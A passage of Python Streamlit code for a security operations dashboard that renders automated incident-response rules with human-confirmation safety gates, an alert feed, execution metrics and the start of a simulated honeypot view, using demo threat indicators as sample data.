                             "Created IR-ARE-P1", "Triggered Malware Containment", "Alerted #soc-critical"],
        },
        {
            "id":           "ARE-EX-002",
            "rule_id":      "ARE-001",
            "rule_name":    "Brute Force — Auto Block & Disable",
            "technique":    "T1110",
            "target_ip":    "91.121.55.22",
            "target_domain":"ssh.target.internal",
            "threat_score": 78,
            "confidence":   88,
            "severity":     "high",
            "executed_at":  (datetime.now() - timedelta(minutes=45)).strftime("%H:%M:%S"),
            "steps_total":  5,
            "steps_auto":   5,
            "duration_sec": 10,
            "outcome":      "SUCCESS",
            "actions_taken":["Blocked 91.121.55.22 (847 auth failures)", "Created IR-ARE-P2",
                             "Triggered Credential Compromise playbook", "Alerted #soc-alerts"],
        },
        {
            "id":           "ARE-EX-003",
            "rule_id":      "ARE-005",
            "rule_name":    "Data Exfiltration — Block & Preserve",
            "technique":    "T1041",
            "target_ip":    "45.33.32.156",
            "target_domain":"exfil-drop.xyz",
            "threat_score": 84,
            "confidence":   79,
            "severity":     "critical",
            "executed_at":  (datetime.now() - timedelta(hours=2)).strftime("%H:%M:%S"),
            "steps_total":  6,
            "steps_auto":   5,
            "duration_sec": 18,
            "outcome":      "PARTIAL — manual step pending",
            "actions_taken":["Blocked outbound to 45.33.32.156", "Throttled LAPTOP-03 to 100Kbps",
                             "Created P1 + Legal ticket", "Triggered Exfil playbook", "Alerted #soc-critical"],
        },
    ]
    st.session_state.are_execution_history = demo


def render_autonomous_response_engine():
    _are_init_demo_history()

    st.markdown(
        "<h2 style='color:#00f9ff;font-family:Orbitron,sans-serif;margin-bottom:0'>"
        "⚡ Autonomous Response Engine</h2>"
        "<p style='color:#446688;font-size:0.78rem;margin-top:4px'>"
        "Palo Alto XSOAR · CrowdStrike Fusion · Splunk SOAR architecture · "
        "MITRE-triggered · auto-block · auto-ticket · auto-playbook · Slack notify</p>",
        unsafe_allow_html=True)

    # ── KPI Strip ─────────────────────────────────────────────────────────────
    history = _are_get_history()
    rules   = st.session_state.get("are_rules_override", _ARE_RULES)
    enabled = [r for r in rules if r.get("enabled", True)]
    k1,k2,k3,k4,k5,k6 = st.columns(6)
    k1.metric("Total Rules",        len(rules))
    k2.metric("Enabled",            len(enabled),  delta="LIVE" if enabled else None)
    k3.metric("Executions Today",   len(history),  delta=f"+{len([h for h in history if h.get('outcome','').startswith('SUCCESS')])} success")
    k4.metric("Actions Taken",      sum(len(h.get("actions_taken", [])) for h in history))
    k5.metric("IPs Blocked",        len(st.session_state.get("blocklist", [])))
    k6.metric("IR Cases Auto-Created", len([c for c in st.session_state.get("ir_cases", []) if c.get("auto")]))

    st.markdown("<div style='height:6px'></div>", unsafe_allow_html=True)

    # ── Main Tabs ─────────────────────────────────────────────────────────────
    tab_engine, tab_rules, tab_exec, tab_feed, tab_metrics = st.tabs([
        "🔴 Live Engine",
        "📋 Response Rules",
        "▶ Execute / Simulate",
        "📣 Alert Feed",
        "📊 Metrics",
    ])

    # ════════════════════════════════════════════════════════════════════════
    # TAB 1 — LIVE ENGINE
    # Shows which rules are armed + real-time readiness panel
    # ════════════════════════════════════════════════════════════════════════
    with tab_engine:
        # Master toggle
        col_eng1, col_eng2, col_eng3 = st.columns([2, 1, 1])
        _are_active = col_eng1.toggle(
            "🟢 ARE Engine ARMED — automatically responds to MITRE detections",
            value=st.session_state.get("are_armed", True),
            key="are_master_toggle")
        st.session_state.are_armed = _are_active

        if _are_active:
            col_eng2.success("ENGINE ARMED")
        else:
            col_eng2.error("ENGINE DISARMED")

        _auto_only = col_eng3.toggle("Auto-actions only", value=True, key="are_auto_only_t")

        st.markdown("<div style='height:6px'></div>", unsafe_allow_html=True)

        # Trigger from live MITRE detections in session state
        live_mitre = []
        # Check analysis results
        if st.session_state.get("last_analysis"):
            _a = st.session_state.last_analysis
            _techs = _a.get("mitre_all", [])
            _score = _a.get("threat_score", 0)
            if _techs and _score >= 40:
                for t in _techs:
                    live_mitre.append({
                        "technique": t.get("technique", ""),
                        "ip":        _a.get("ip", ""),
                        "domain":    _a.get("domain", ""),
                        "score":     _score,
                        "confidence": _a.get("mitre_confidence", 70),
                    })
        # Check triage alerts
        for _alert in st.session_state.get("triage_alerts", [])[:5]:
            _tech = _alert.get("mitre", "")
            if _tech:
                live_mitre.append({
                    "technique": _tech,
                    "ip":        _alert.get("ip", ""),
                    "domain":    _alert.get("host", ""),
                    "score":     _alert.get("threat_score", 60),
                    "confidence": 75,
                })

        # Find matching rules for live detections
        _matching = []
        for _sig in live_mitre:
            for rule in enabled:
                if rule["technique"] in (_sig["technique"], _sig["technique"][:5]):
                    if _sig["score"] >= rule["confidence_threshold"]:
                        _matching.append({"rule": rule, "signal": _sig})

        if _matching:
            st.markdown(
                f"<div style='background:rgba(255,0,51,0.08);border:2px solid #ff003344;"
                f"border-radius:10px;padding:12px 18px;margin-bottom:14px'>"
                f"<span style='color:#ff0033;font-weight:900;font-size:0.9rem'>🚨 LIVE TRIGGERS DETECTED — "
                f"{len(_matching)} rule(s) ready to fire</span></div>",
                unsafe_allow_html=True)

            for _m in _matching[:5]:
                _r = _m["rule"]
                _s = _m["signal"]
                _sc = _ARE_SEV.get(_r["severity"], "#888")
                with st.container(border=True):
                    c1, c2, c3 = st.columns([3, 1, 1])
                    with c1:
                        st.markdown(
                            f"<span style='color:{_sc};font-weight:700'>{_r['rule_id']}</span> "
                            f"— {_r['name']}  "
                            f"<code style='background:#0a1422;color:#00ffc8;padding:1px 6px;border-radius:4px'>"
                            f"{_r['technique']}</code>",
                            unsafe_allow_html=True)
                        st.caption(f"Target: {_s.get('domain') or _s.get('ip')} · Score: {_s['score']}/100")
                    c2.markdown(f"<span style='color:{_sc};font-weight:700'>{_r['severity'].upper()}</span>", unsafe_allow_html=True)
                    if c3.button("⚡ Fire NOW", key=f"live_fire_{_r['rule_id']}_{_s['technique']}_{id(_s)}", type="primary", use_container_width=True):
                        with st.spinner(f"Executing {_r['rule_id']}…"):
                            _log = _are_execute_rule(
                                _r, _s.get("ip", ""), _s.get("domain", ""),
                                _s["score"], _s["confidence"])
                            _exec_entry = {
                                "id":           f"ARE-EX-{datetime.now().strftime('%H%M%S')}",
                                "rule_id":      _r["rule_id"],
                                "rule_name":    _r["name"],
                                "technique":    _r["technique"],
                                "target_ip":    _s.get("ip", ""),
                                "target_domain":_s.get("domain", ""),
                                "threat_score": _s["score"],
                                "confidence":   _s["confidence"],
                                "severity":     _r["severity"],
                                "executed_at":  datetime.now().strftime("%H:%M:%S"),
                                "steps_total":  len(_r["actions"]),
                                "steps_auto":   sum(1 for a in _r["actions"] if a["auto"]),
                                "duration_sec": len(_r["actions"]) * 2,
                                "outcome":      "SUCCESS",
                                "actions_taken": [a["name"] for a in _r["actions"] if a["auto"]],
                                "log":          _log,
                            }
                            if "are_execution_history" not in st.session_state:
                                st.session_state.are_execution_history = []
                            st.session_state.are_execution_history.insert(0, _exec_entry)
                        st.success(f"✅ {_r['rule_id']} executed — {len(_log)} actions completed")
                        st.rerun()
        else:
            st.info("No live MITRE detections currently matching rules. Run a domain analysis or generate triage alerts to trigger live responses.")

        # ── Armed rules status table ───────────────────────────────────────
        st.markdown(
            "<div style='color:#00f9ff;font-size:0.68rem;letter-spacing:2px;"
            "text-transform:uppercase;margin:16px 0 8px'>⚙️ ARMED RULES STATUS</div>",
            unsafe_allow_html=True)
        for rule in rules:
            _sc   = _ARE_SEV.get(rule["severity"], "#888")
            _arm  = rule.get("enabled", True)
            _arm_c= "#00c878" if _arm else "#444"
            _arm_t= "ARMED" if _arm else "OFF"
            st.markdown(
                f"<div style='display:flex;align-items:center;gap:12px;padding:7px 14px;"
                f"background:rgba(0,5,15,0.5);border:1px solid #0a1a2a;border-radius:8px;margin-bottom:4px'>"
                f"<code style='color:#446688;font-size:0.7rem;min-width:70px'>{rule['rule_id']}</code>"
                f"<span style='flex:1;color:#c0d0e0;font-size:0.78rem'>{rule['name']}</span>"
                f"<code style='background:#0a1422;color:#00ffc8;padding:1px 7px;border-radius:4px;font-size:0.72rem'>{rule['technique']}</code>"
                f"<span style='color:{_sc};font-size:0.72rem;font-weight:700;min-width:50px'>{rule['severity'].upper()}</span>"
                f"<span style='background:{_arm_c}22;color:{_arm_c};border:1px solid {_arm_c}55;"
                f"padding:1px 9px;border-radius:8px;font-size:0.65rem;font-weight:700'>{_arm_t}</span>"
                f"</div>",
                unsafe_allow_html=True)

    # ════════════════════════════════════════════════════════════════════════
    # TAB 2 — RESPONSE RULES
    # Full rule editor — enable/disable, view actions, edit thresholds
    # ════════════════════════════════════════════════════════════════════════
    with tab_rules:
        st.markdown(
            "<div style='color:#446688;font-size:0.72rem;margin-bottom:12px'>"
            "10 pre-built response rules covering the full MITRE ATT&CK kill chain. "
            "Enable/disable per rule. Adjust confidence thresholds. View all actions per rule.</div>",
            unsafe_allow_html=True)

        for rule in _ARE_RULES:
            _sc  = _ARE_SEV.get(rule["severity"], "#888")
            _arm = rule.get("enabled", True)
            with st.container(border=True):
                hc1, hc2, hc3, hc4 = st.columns([3, 1, 1, 1])
                with hc1:
                    st.markdown(
                        f"<span style='color:{_sc};font-weight:900;font-family:Orbitron,sans-serif'>"
                        f"{rule['rule_id']}</span>  "
                        f"<span style='color:#e0e8f0;font-weight:700'>{rule['name']}</span>  "
                        f"<code style='background:#0a1422;color:#00ffc8;padding:1px 6px;border-radius:4px;font-size:0.73rem'>"
                        f"{rule['technique']}</code>",
                        unsafe_allow_html=True)
                    st.caption(f"Tactic: {rule['tactic']} · Trigger: {rule['trigger']}")
                hc2.markdown(f"<span style='color:{_sc};font-weight:700'>{rule['severity'].upper()}</span>", unsafe_allow_html=True)
                _new_enabled = hc3.toggle("Armed", value=_arm, key=f"are_en_{rule['rule_id']}")
                rule["enabled"] = _new_enabled
                hc4.caption(f"Playbook: {rule['playbook'][:18]}")

                # Confidence threshold slider
                _new_conf = st.slider(
                    f"Min confidence to fire — {rule['rule_id']}",
                    30, 95, rule["confidence_threshold"],
                    key=f"are_conf_{rule['rule_id']}", label_visibility="collapsed")
                rule["confidence_threshold"] = _new_conf

                # MITRE description
                st.markdown(
                    f"<div style='color:#556677;font-size:0.73rem;font-style:italic;margin:4px 0 8px 0'>"
                    f"ℹ️ {rule['mitre_description']}</div>",
                    unsafe_allow_html=True)

                # Action steps
                _auto_count = sum(1 for a in rule["actions"] if a["auto"])
                st.markdown(
                    f"<div style='color:#00f9ff;font-size:0.65rem;letter-spacing:1px;margin-bottom:6px'>"
                    f"RESPONSE CHAIN — {len(rule['actions'])} steps · {_auto_count} auto · "
                    f"{len(rule['actions'])-_auto_count} manual</div>",
                    unsafe_allow_html=True)
                _acs = st.columns(min(len(rule["actions"]), 5))
                for _i, _action in enumerate(rule["actions"]):
                    _style = _ARE_ACTION_STYLE.get(_action["type"], {"color":"#888","icon":"▸","bg":""})
                    _ac = _acs[_i % len(_acs)]
                    _ac.markdown(
                        f"<div style='background:{_style['bg']};border:1px solid {_style['color']}44;"
                        f"border-top:3px solid {_style['color']};border-radius:0 0 8px 8px;"
                        f"padding:6px 8px;text-align:center;font-size:0.68rem;min-height:70px'>"
                        f"<div style='font-size:1rem'>{_style['icon']}</div>"
                        f"<div style='color:{_style['color']};font-weight:700;margin-top:2px'>{_action['type']}</div>"
                        f"<div style='color:#a0b8c0;margin-top:2px;font-size:0.65rem'>{_action['name'][:22]}</div>"
                        f"<div style='color:#445566;font-size:0.6rem;margin-top:1px'>"
                        f"{'🤖 AUTO' if _action['auto'] else '👤 MANUAL'}</div>"
                        f"</div>",
                        unsafe_allow_html=True)

    # ════════════════════════════════════════════════════════════════════════
    # TAB 3 — EXECUTE / SIMULATE
    # Manual trigger any rule against any target — full step-by-step execution
    # ════════════════════════════════════════════════════════════════════════
    with tab_exec:
        st.markdown(
            "<div style='color:#446688;font-size:0.72rem;margin-bottom:12px'>"
            "Manually trigger any response rule against a target. "
            "Simulates the full automated response chain with real session state writes.</div>",
            unsafe_allow_html=True)

        ec1, ec2 = st.columns([1, 2])
        with ec1:
            _rule_options = {r["rule_id"]: f"{r['rule_id']} — {r['name']}" for r in _ARE_RULES}
            _sel_rule_id  = st.selectbox("Select Rule", list(_rule_options.keys()),
                                          format_func=lambda x: _rule_options[x], key="are_exec_rule")
            _sel_rule = next(r for r in _ARE_RULES if r["rule_id"] == _sel_rule_id)
            _exec_ip     = st.text_input("Target IP",     value="185.220.101.47", key="are_exec_ip")
            _exec_domain = st.text_input("Target Domain", value="malware-c2.tk",  key="are_exec_domain")
            _exec_score  = st.slider("Threat Score", 0, 100, 85, key="are_exec_score")
            _exec_conf   = st.slider("MITRE Confidence %", 0, 100, 88, key="are_exec_conf")
            _exec_auto_only = st.toggle("Auto steps only", value=True, key="are_exec_auto")

            _sc_rule = _ARE_SEV.get(_sel_rule["severity"], "#888")
            st.markdown(
                f"<div style='background:rgba(0,5,15,0.7);border:1px solid {_sc_rule}44;"
                f"border-left:4px solid {_sc_rule};border-radius:0 8px 8px 0;padding:10px 14px;margin-top:8px'>"
                f"<div style='color:{_sc_rule};font-weight:700;font-size:0.8rem'>{_sel_rule['severity'].upper()} · {_sel_rule['technique']}</div>"
                f"<div style='color:#a0b8c0;font-size:0.72rem;margin-top:4px'>{_sel_rule['mitre_description'][:120]}</div>"
                f"<div style='color:#334455;font-size:0.68rem;margin-top:6px'>"
                f"{len(_sel_rule['actions'])} actions · Playbook: {_sel_rule['playbook']}</div>"
                f"</div>",
                unsafe_allow_html=True)

            _exec_clicked = st.button("⚡ Execute Response Chain",
                                       type="primary", use_container_width=True, key="are_exec_btn")

        with ec2:
            if _exec_clicked:
                # ── Fine-Tune 6: Dual Safety Gate ─────────────────────────────
                # High-impact actions (ISOLATE, BLOCK) require:
                #   Gate 1: threat_score > 85
                #   Gate 2: human confirmation toggle must be ON
                # This prevents false response rate from exceeding 1%
                _HIGH_IMPACT_ACTION_TYPES = {"ISOLATE", "BLOCK", "CONTAIN"}
                _has_high_impact = any(
                    a.get("type","").upper() in _HIGH_IMPACT_ACTION_TYPES
                    for a in _sel_rule["actions"] if a.get("auto")
                )
                _gate1_score_ok  = _exec_score >= 85
                _gate2_confirmed = st.session_state.get("are_human_confirm_gate", False)

                # Show gate status before executing
                _g1c = "#00c878" if _gate1_score_ok else "#ff0033"
                _g2c = "#00c878" if _gate2_confirmed else "#ff9900"
                st.markdown(
                    f"<div style='background:#050a05;border:1px solid #1a2a1a;"
                    f"border-radius:8px;padding:10px 16px;margin-bottom:12px'>"
                    f"<div style='color:#00c878;font-size:.68rem;font-weight:700;letter-spacing:1px;"
                    f"margin-bottom:8px'>🔒 DUAL SAFETY GATE — FINE-TUNED (Target: False Response Rate &lt;1%)</div>"
                    f"<div style='display:flex;gap:20px'>"
                    f"<div><span style='color:{_g1c};font-weight:700'>{'✅' if _gate1_score_ok else '❌'} Gate 1</span>"
                    f"<div style='color:#8899cc;font-size:.7rem'>Threat Score ≥85<br>"
                    f"<b style='color:{_g1c}'>Current: {_exec_score}/100</b></div></div>"
                    f"<div><span style='color:{_g2c};font-weight:700'>{'✅' if _gate2_confirmed else '⚠️'} Gate 2</span>"
                    f"<div style='color:#8899cc;font-size:.7rem'>Human Confirmation<br>"
                    f"<b style='color:{_g2c}'>{'Confirmed' if _gate2_confirmed else 'Required for high-impact'}</b></div></div>"
                    f"</div></div>",
                    unsafe_allow_html=True)

                # Require confirmation for high-impact + low score
                if _has_high_impact and not _gate1_score_ok:
                    st.error(f"❌ **Gate 1 BLOCKED** — High-impact action requires threat score ≥85 (current: {_exec_score}). "
                              f"Raise threat score or switch to low-impact actions only.")
                elif _has_high_impact and not _gate2_confirmed:
                    st.warning("⚠️ **Gate 2 PENDING** — High-impact action (ISOLATE/BLOCK) requires human confirmation. "
                                "Toggle 'Confirm High-Impact' below to proceed.")
                    st.toggle("✅ Confirm High-Impact Action (I have reviewed the evidence)",
                               key="are_human_confirm_gate", value=False)
                else:
                    # Both gates clear — proceed with execution
                    if _has_high_impact and _gate2_confirmed:
                        st.success("✅ Both safety gates cleared — executing high-impact response.")

                    st.markdown(
                        f"<div style='color:#00f9ff;font-size:0.7rem;letter-spacing:2px;"
                        f"text-transform:uppercase;margin-bottom:10px'>"
                        f"⚡ EXECUTING {_sel_rule_id} — {_sel_rule['name']}</div>",
                        unsafe_allow_html=True)

                    _steps = [a for a in _sel_rule["actions"] if a["auto"] or not _exec_auto_only]
                    _prog = st.progress(0)
                    _log_area = st.empty()
                    _live_log = []

                    import time as _t
                    for _i, _act in enumerate(_steps):
                        _t.sleep(0.4)
                        _prog.progress((_i + 1) / len(_steps))
                        _astyle = _ARE_ACTION_STYLE.get(_act["type"], {"color":"#888","icon":"▸","bg":""})
                        _gate_tag = " [GATE-CLEARED]" if _act.get("type","").upper() in _HIGH_IMPACT_ACTION_TYPES else ""
                        _live_log.append(
                            f"[{datetime.now().strftime('%H:%M:%S')}] "
                            f"{_astyle['icon']} {_act['type']:8s} "
                            f"Step {_act['step']:02d}: {_act['name']:30s} "
                            f"[{_act['tool']}] {'✅ AUTO' if _act['auto'] else '⏸️ MANUAL'}{_gate_tag}")
                        _log_area.code("\n".join(_live_log), language="text")

                    _prog.progress(1.0)

                    # Actually execute (write to state)
                    _exec_log = _are_execute_rule(
                        _sel_rule, _exec_ip, _exec_domain, _exec_score, _exec_conf)
                    _exec_entry = {
                        "id":           f"ARE-EX-{datetime.now().strftime('%H%M%S')}",
                        "rule_id":      _sel_rule["rule_id"],
                        "rule_name":    _sel_rule["name"],
                        "technique":    _sel_rule["technique"],
                        "target_ip":    _exec_ip,
                        "target_domain":_exec_domain,
                        "threat_score": _exec_score,
                        "confidence":   _exec_conf,
                        "severity":     _sel_rule["severity"],
                        "executed_at":  datetime.now().strftime("%H:%M:%S"),
                        "steps_total":  len(_sel_rule["actions"]),
                        "steps_auto":   sum(1 for a in _sel_rule["actions"] if a["auto"]),
                        "duration_sec": len(_sel_rule["actions"]) * 2,
                        "outcome":      "SUCCESS",
                        "actions_taken": [a["name"] for a in _sel_rule["actions"] if a["auto"]],
                        "log":          _exec_log,
                        # Fine-Tune 6: Audit fields for SOC 2 compliance
                        "gate1_score":     _exec_score,
                        "gate2_confirmed": _gate2_confirmed,
                        "high_impact":     _has_high_impact,
                        "rollback_available": True,
                        "rollback_steps": [
                            f"Unblock {_exec_ip}" if any(a["type"]=="BLOCK" for a in _sel_rule["actions"]) else None,
                            f"Re-enable host isolation" if any(a["type"]=="ISOLATE" for a in _sel_rule["actions"]) else None,
                        ],
                    }
                    if "are_execution_history" not in st.session_state:
                        st.session_state.are_execution_history = []
                    st.session_state.are_execution_history.insert(0, _exec_entry)

                    # Summary
                    _n_block  = sum(1 for a in _sel_rule["actions"] if a["type"] == "BLOCK" and a["auto"])
                    _n_ticket = sum(1 for a in _sel_rule["actions"] if a["type"] == "TICKET" and a["auto"])
                    _n_notify = sum(1 for a in _sel_rule["actions"] if a["type"] == "NOTIFY" and a["auto"])
                    _n_pb     = sum(1 for a in _sel_rule["actions"] if a["type"] == "PLAYBOOK" and a["auto"])
                    r1, r2, r3, r4 = st.columns(4)
                    r1.metric("IPs Blocked",     _n_block)
                    r2.metric("Tickets Created", _n_ticket)
                    r3.metric("Notifications",   _n_notify)
                    r4.metric("Playbooks Run",   _n_pb)
                    st.success(f"✅ {_sel_rule_id} completed in {len(_steps)*2}s — {len(_steps)} steps executed")

                    # Fine-Tune 6: Rollback option in expander
                    with st.expander("🔄 Rollback Options (Audit Trail)", expanded=False):
                        st.caption("Every auto-action is logged with rollback instructions. Required for SOC 2 audit compliance.")
                        for _rb in _exec_entry["rollback_steps"]:
                            if _rb:
                                st.markdown(f"- `{_rb}`")
                        st.info(f"Execution ID: `{_exec_entry['id']}` · "
                                f"Gate1 Score: {_exec_entry['gate1_score']}/100 · "
                                f"Gate2 Confirmed: {'Yes' if _exec_entry['gate2_confirmed'] else 'No'} · "
                                f"Logged: {_exec_entry['executed_at']}")
            else:
                # Preview the rule
                st.markdown(
                    "<div style='color:#00f9ff;font-size:0.68rem;letter-spacing:2px;"
                    "text-transform:uppercase;margin-bottom:10px'>RESPONSE CHAIN PREVIEW</div>",
                    unsafe_allow_html=True)
                for _i, _act in enumerate(_sel_rule["actions"]):
                    _astyle = _ARE_ACTION_STYLE.get(_act["type"], {"color":"#888","icon":"▸","bg":""})
                    _ac = _astyle["color"]
                    _connector = (
                        f"<div style='width:2px;height:14px;background:linear-gradient({_ac}88,{_ac}33);"
                        f"margin:0 0 0 20px'></div>"
                        if _i < len(_sel_rule["actions"]) - 1 else ""
                    )
                    st.markdown(
                        f"<div style='display:flex;align-items:flex-start;gap:12px;margin:0'>"
                        f"<div style='width:28px;height:28px;background:{_astyle['bg']};"
                        f"border:2px solid {_ac}55;border-radius:50%;display:flex;align-items:center;"
                        f"justify-content:center;flex-shrink:0;font-size:0.9rem'>{_astyle['icon']}</div>"
                        f"<div style='background:rgba(0,5,15,0.6);border:1px solid {_ac}33;"
                        f"border-left:3px solid {_ac};border-radius:0 8px 8px 0;"
                        f"padding:6px 12px;flex:1;margin-bottom:2px'>"
                        f"<div style='display:flex;gap:8px;align-items:center'>"
                        f"<span style='color:{_ac};font-weight:700;font-size:0.75rem'>{_act['type']}</span>"
                        f"<span style='color:#c0d0e0;font-size:0.78rem'>{_act['name']}</span>"
                        f"<span style='background:rgba(0,0,0,0.3);color:#556677;font-size:0.62rem;"
                        f"padding:1px 6px;border-radius:6px'>{'🤖 AUTO' if _act['auto'] else '👤 MANUAL'}</span>"
                        f"</div>"
                        f"<div style='color:#446688;font-size:0.72rem;margin-top:3px'>{_act['detail']}</div>"
                        f"<div style='color:#334455;font-size:0.65rem;margin-top:2px'>Tool: {_act['tool']}</div>"
                        f"</div></div>"
                        f"{_connector}",
                        unsafe_allow_html=True)

    # ════════════════════════════════════════════════════════════════════════
    # TAB 4 — ALERT FEED
    # Real-time Slack-style notification log from ARE + SOAR executions
    # ════════════════════════════════════════════════════════════════════════
    with tab_feed:
        _notifs = st.session_state.get("soar_notifications", [])
        _history = _are_get_history()

        # Build unified feed from both ARE history and SOAR notifications
        _feed = []
        for _h in _history:
            _feed.append({
                "time":     _h.get("executed_at", ""),
                "severity": _h.get("severity", "high"),
                "source":   "ARE Engine",
                "channel":  "#soc-critical" if _h.get("severity") == "critical" else "#soc-alerts",
                "msg":      (f"⚡ *[{_h['rule_id']}]* `{_h['technique']}` responded — "
                             f"Target: `{_h.get('target_domain') or _h.get('target_ip')}` | "
                             f"Score: `{_h['threat_score']}/100` | "
                             f"Actions: {len(_h.get('actions_taken', []))}"),
                "actions":  _h.get("actions_taken", []),
            })
        for _n in _notifs:
            _feed.append({
                "time":     _n.get("time", "")[:19].replace("T", " "),
                "severity": _n.get("severity", "high"),
                "source":   "SOAR Engine",
                "channel":  _n.get("channel", "#soc-alerts"),
                "msg":      _n.get("msg", ""),
                "actions":  [],
            })

        _fc1, _fc2, _fc3 = st.columns([2, 1, 1])
        _chan_f = _fc1.multiselect("Filter channel", ["#soc-critical", "#soc-alerts", "#ciso-alerts"], key="feed_chan_f")
        _sev_f  = _fc2.multiselect("Severity", ["critical", "high", "medium"], key="feed_sev_f")
        if _fc3.button("🔄 Refresh Feed", use_container_width=True, key="feed_refresh"):
            st.rerun()

        _feed_filtered = [f for f in _feed
                          if (not _chan_f or f["channel"] in _chan_f)
                          and (not _sev_f or f["severity"] in _sev_f)]

        if not _feed_filtered:
            st.info("No alert notifications yet. Execute a response rule to generate feed entries.")
        else:
            # Slack-style feed
            _CHAN_C = {"#soc-critical": "#ff0033", "#soc-alerts": "#ff9900",
                       "#ciso-alerts": "#9b59b6", "#soc-alerts": "#ffcc00"}
            for _f in _feed_filtered[:30]:
                _sev_c  = _ARE_SEV.get(_f["severity"], "#888")
                _chan_c  = "#ff9900" if "critical" in _f["channel"] else "#3498db"
                _src_c  = "#00c878" if "ARE" in _f["source"] else "#9b59b6"
                _time_s = _f["time"][:8] if _f["time"] else "--:--:--"
                st.markdown(
                    f"<div style='background:rgba(0,5,15,0.7);border:1px solid #0a1a2a;"
                    f"border-left:4px solid {_sev_c};border-radius:0 8px 8px 0;"
                    f"padding:10px 16px;margin-bottom:6px'>"
                    f"<div style='display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:5px'>"
                    f"<code style='color:{_chan_c};font-size:0.75rem'>{_f['channel']}</code>"
                    f"<span style='background:{_src_c}22;color:{_src_c};border:1px solid {_src_c}55;"
                    f"padding:1px 8px;border-radius:8px;font-size:0.65rem;font-weight:700'>{_f['source']}</span>"
                    f"<span style='color:#334455;font-size:0.68rem;font-family:monospace'>{_time_s}</span>"
                    f"<span style='background:{_sev_c}22;color:{_sev_c};border:1px solid {_sev_c}44;"
                    f"padding:1px 7px;border-radius:8px;font-size:0.62rem;font-weight:700'>{_f['severity'].upper()}</span>"
                    f"</div>"
                    f"<div style='color:#c0d0e0;font-size:0.8rem'>{_f['msg']}</div>"
                    + (
                        f"<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:5px'>"
                        + "".join(
                            f"<span style='background:rgba(0,249,255,0.06);color:#446688;"
                            f"border:1px solid #0a1a2a;padding:1px 7px;border-radius:5px;font-size:0.62rem'>"
                            f"✓ {_a}</span>"
                            for _a in _f["actions"][:5]
                        )
                        + "</div>"
                        if _f["actions"] else ""
                    )
                    + "</div>",
                    unsafe_allow_html=True)

    # ════════════════════════════════════════════════════════════════════════
    # TAB 5 — METRICS
    # ARE performance metrics, execution history, response time tracking
    # ════════════════════════════════════════════════════════════════════════
    with tab_metrics:
        _hist = _are_get_history()
        if not _hist:
            st.info("No executions yet.")
        else:
            # Summary metrics
            _total   = len(_hist)
            _success = sum(1 for h in _hist if "SUCCESS" in h.get("outcome", ""))
            _actions = sum(len(h.get("actions_taken", [])) for h in _hist)
            _avg_dur = round(sum(h.get("duration_sec", 0) for h in _hist) / max(_total, 1), 1)
            _auto_pct= round(sum(h.get("steps_auto", 0) for h in _hist) /
                             max(sum(h.get("steps_total", 1) for h in _hist), 1) * 100)

            m1,m2,m3,m4,m5 = st.columns(5)
            m1.metric("Total Executions",   _total)
            m2.metric("Success Rate",       f"{round(_success/_total*100)}%")
            m3.metric("Total Actions Taken",_actions)
            m4.metric("Avg Response Time",  f"{_avg_dur}s")
            m5.metric("Automation Rate",    f"{_auto_pct}%")

            # Technique frequency
            from collections import Counter
            _tec_counts = Counter(h["technique"] for h in _hist)
            if _tec_counts:
                import pandas as _pd_m
                _df_t = _pd_m.DataFrame(_tec_counts.most_common(8), columns=["Technique", "Count"])
                _fig_t = px.bar(_df_t, x="Count", y="Technique", orientation="h",
                                color="Count",
                                color_continuous_scale=[[0,"#1a3a6a"],[0.5,"#ff6600"],[1,"#ff0033"]],
                                title="Top Triggered Techniques")
                _fig_t.update_layout(
                    paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
                    font=dict(color="#a0c0e0"), height=250,
                    margin=dict(l=10,r=10,t=30,b=10),
                    coloraxis_showscale=False,
                    xaxis=dict(gridcolor="#1a2a3a"),
                )
                st.plotly_chart(_fig_t, use_container_width=True, key="are_tec_bar")

            # Execution history table
            st.markdown(
                "<div style='color:#00f9ff;font-size:0.68rem;letter-spacing:2px;"
                "text-transform:uppercase;margin:12px 0 8px'>EXECUTION HISTORY</div>",
                unsafe_allow_html=True)
            for _h in _hist:
                _sc_h = _ARE_SEV.get(_h.get("severity", "high"), "#ff6600")
                _out_c = "#00c878" if "SUCCESS" in _h.get("outcome","") else "#ff9900"
                with st.container(border=True):
                    _hc1, _hc2, _hc3, _hc4 = st.columns([2.5, 1, 1, 1])
                    _hc1.markdown(
                        f"<span style='color:{_sc_h};font-weight:700;font-size:0.8rem'>{_h['rule_id']}</span> "
                        f"— {_h['rule_name'][:40]}", unsafe_allow_html=True)
                    _hc1.caption(f"Target: {_h.get('target_domain') or _h.get('target_ip')}")
                    _hc2.markdown(f"<code style='color:#00ffc8'>{_h['technique']}</code>", unsafe_allow_html=True)
                    _hc2.caption(f"Score: {_h['threat_score']}/100")
                    _hc3.markdown(f"<span style='color:{_out_c};font-weight:700;font-size:0.75rem'>{_h['outcome'][:18]}</span>", unsafe_allow_html=True)
                    _hc3.caption(f"{_h['steps_auto']}/{_h['steps_total']} auto")
                    _hc4.caption(_h.get("executed_at", ""))
                    _hc4.caption(f"{_h.get('duration_sec', 0)}s response")


def render_honeypot():
    st.header("🍯 Deception Technology — Honeypot Dashboard")
    st.caption("Fake SSH · Fake DB · Fake Admin · Cowrie/OpenCanary integration · Attacker profiling")

    import random as _r

    # Simulated honeypot stats
    tab_dashboard, tab_attacks, tab_config = st.tabs(["📊 Dashboard","🔴 Attack Feed","⚙️ Config"])

    with tab_dashboard:
        h1,h2,h3,h4,h5 = st.columns(5)
        h1.metric("Attacks Today",     _r.randint(38,65))
        h2.metric("Unique Attackers",  _r.randint(12,25))
        h3.metric("Active Honeypots",  4)
        h4.metric("Credentials Stolen",_r.randint(5,15))
        h5.metric("Threat Score Avg",  f"{_r.randint(72,91)}/100")

        col_map, col_top = st.columns([2,1])
        with col_map:
            # Attacker origin chart
            origins = {"Russia":_r.randint(8,20),"China":_r.randint(5,15),
                       "USA":_r.randint(3,8),"Netherlands":_r.randint(2,6),
                       "Iran":_r.randint(1,5),"Brazil":_r.randint(1,4),
                       "Unknown":_r.randint(2,8)}
            fig = px.bar(pd.DataFrame(list(origins.items()),columns=["Country","Attacks"]),
                         x="Attacks",y="Country",orientation="h",
                         color="Attacks",color_continuous_scale="Reds",
                         title="Attacker Origins")
            fig.update_layout(paper_bgcolor="#0e1117",plot_bgcolor="#0e1117",
                               font={"color":"white"},height=300)
            st.plotly_chart(fig, use_container_width=True, key="hp_origins")

